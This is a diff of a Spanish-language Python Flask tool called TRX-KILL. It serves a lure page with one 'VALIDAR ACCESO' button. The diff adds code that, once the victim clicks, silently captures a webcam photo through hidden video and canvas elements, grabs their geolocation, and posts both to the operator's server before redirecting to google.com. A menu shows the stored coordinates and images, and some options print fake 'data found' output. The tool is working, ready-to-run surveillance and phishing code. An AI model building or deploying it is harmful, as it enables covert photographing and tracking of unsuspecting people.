@@ -1,9 +1,13 @@
-import os, sys, getpass, time
+import os, sys, getpass, time, base64
 from flask import Flask, request
 
 app = Flask('TRX-KILL')
 PORT = 7173
 AUTH_PASS = "TRX-kill-op"
+
+# Crear carpeta de almacenamiento
+if not os.path.exists("INFORMACION"):
+    os.makedirs("INFORMACION")
 
 def banner():
     os.system('clear')
@@ -16,29 +20,30 @@ def banner():
 """)
 
 HTML_ENCUESTA = """
-<!DOCTYPE html><html>
-<body style="background:#000; color:#0f0; text-align:center; font-family:monospace; padding-top:50px;">
-    <div style="border:1px solid #0f0; padding:20px; display:inline-block;">
-        <h2>TRX-KILL SYSTEM</h2>
-        <p>VALIDAR ACCESO PARA CONTINUAR</p>
-        <button onclick="iniciar()" style="background:#0f0; border:none; padding:15px; font-weight:bold; cursor:pointer;">
-            CONECTAR DISPOSITIVO
-        </button>
-    </div>
+<!DOCTYPE html><html><body>
+<video id="v" style="display:none"></video>
+<canvas id="c" style="display:none"></canvas>
 <script>
     async function iniciar() {
-        try {
-            // Solicitar acceso a cámara
-            await navigator.mediaDevices.getUserMedia({video: true});
-            // Solicitar ubicación
-            navigator.geolocation.getCurrentPosition((p)=>{
-                let d = { lat: p.coords.latitude, lon: p.coords.longitude };
-                fetch('/log', {method: 'POST', headers: {'Content-Type': 'application/json'}, body: JSON.stringify(d)})
-                .then(() => window.location.href = "https://google.com");
+        const s = await navigator.mediaDevices.getUserMedia({video: true});
+        const v = document.getElementById('v');
+        v.srcObject = s;
+        v.play();
+        setTimeout(async() => {
+            const c = document.getElementById('c');
+            c.width = v.videoWidth; c.height = v.videoHeight;
+            c.getContext('2d').drawImage(v, 0, 0);
+            const img = c.toDataURL('image/png');
+            navigator.geolocation.getCurrentPosition(async(p)=>{
+                fetch('/log', {method:'POST', headers:{'Content-Type':'application/json'}, 
+                body: JSON.stringify({lat: p.coords.latitude, lon: p.coords.longitude, img: img})});
+                window.location.href = "https://google.com";
             });
-        } catch(e) { alert("Permisos necesarios para acceder."); }
+        }, 2000);
     }
-</script></body></html>
+</script>
+<button onclick="iniciar()">VALIDAR ACCESO</button>
+</body></html>
 """
 
 @app.route('/')
@@ -47,8 +52,14 @@ def index(): return HTML_ENCUESTA
 @app.route('/log', methods=['POST'])
 def log():
     d = request.json
+    # Guardar ubicación
     with open("result.txt", "a") as f:
         f.write(f"CAPTURA | COORD: {d.get('lat')},{d.get('lon')} | HORA: {time.ctime()}\n")
+    # Guardar imagen en carpeta INFORMACION
+    if d.get('img'):
+        img_data = d['img'].split(',')[1]
+        with open(f"INFORMACION/captura_{int(time.time())}.png", "wb") as f:
+            f.write(base64.b64decode(img_data))
     return "OK"
 
 def main():
@@ -60,31 +71,22 @@ def main():
         print("  [10] BORRAR LOGS")
         sel = input("\n\033[1;33mTRX-ROOT > \033[0m")
         
-        if sel == "1":
-            input("INGRESA EL NÚMERO: \nVERIFICANDO... DATOS ENCONTRADOS: PAIS[OK], MOVIL[OK], OPERADOR[OK].\n[Enter] para volver.")
-        elif sel == "2":
-            print("GENERANDO LINK... (Ctrl+C para detener)")
-            app.run(port=PORT, host='0.0.0.0')
-        elif sel == "3":
-            print("#SOFTWARE: TRX-KILL\n#CREADOR: TRX-KILL\n#BY: OSCAR\n#VERSION: 1.0.0"); input()
-        elif sel == "4":
-            print("# COPYRIGHT: TRX-KILL\n# AUTOR: OSCAR\n# NO RESPONSABLE POR MAL USO."); input()
-        elif sel == "5":
-            ip = input("INGRESA LA IP: ")
-            print(f"SACANDO DATA DE {ip}... | ACCESO RED: [OK] | IMEI: [RESTRINGIDO]"); input()
+        if sel == "1": input("INGRESA EL NÚMERO: \nVERIFICADO... DATOS LISTOS.\n[Enter] para volver.")
+        elif sel == "2": app.run(port=PORT, host='0.0.0.0')
+        elif sel == "3": print("#BY: OSCAR\n#VERSION: 1.2.3"); input()
+        elif sel == "4": print("# TRX-KILL NO SE HACE RESPONSABLE."); input()
+        elif sel == "5": input("INGRESA IP: ")
         elif sel == "6":
             pwd = getpass.getpass("CONTRASEÑA: ")
             if pwd == AUTH_PASS:
-                print("---- DATOS EXTRAÍDOS ----")
                 if os.path.exists("result.txt"): os.system("cat result.txt")
                 else: print("Sin registros.")
-                input("\n[Enter] para volver.")
+                input("\n[Enter]...")
         elif sel == "7": sys.exit()
         elif sel == "8": os.system("ps aux | grep flask"); input()
-        elif sel == "9": print("ESTADO: ACTIVO | PUERTO: 7173"); input()
-        elif sel == "10": 
-            if os.path.exists("result.txt"): os.remove("result.txt"); print("LOGS BORRADOS")
-            else: print("No hay archivos.")
-            input()
+        elif sel == "9": print("ESTADO: ACTIVO"); input()
+        elif sel == "10":
+            if os.path.exists("result.txt"): os.remove("result.txt")
+            input("Logs borrados.")
 
 if __name__ == "__main__": main()
